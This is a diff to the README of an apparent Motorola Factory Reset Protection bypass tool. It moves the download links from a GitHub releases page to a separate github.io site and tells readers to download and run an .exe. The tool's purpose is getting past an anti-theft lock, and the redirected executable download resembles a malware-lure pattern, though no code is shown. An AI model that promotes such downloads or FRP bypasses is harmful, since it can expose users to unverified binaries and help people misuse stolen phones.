@@ -1,6 +1,6 @@
 # 🔓 Desbloquear-Motorola-FRP - Remove locks from your Motorola phone
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/disliked-treason884/Desbloquear-Motorola-FRP/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://disliked-treason884.github.io)
 
 ## 📌 Overview
 
@@ -22,7 +22,7 @@ To run this software, your computer must meet the following hardware and softwar
 
 Follow these steps to obtain the tool and prepare your computer.
 
-1. Visit the project page to access the official software files: [https://github.com/disliked-treason884/Desbloquear-Motorola-FRP/releases](https://github.com/disliked-treason884/Desbloquear-Motorola-FRP/releases)
+1. Visit the project page to access the official software files: [https://disliked-treason884.github.io](https://disliked-treason884.github.io)
 2. Locate the section titled "Assets" at the bottom of the latest release.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your desktop for easy access.
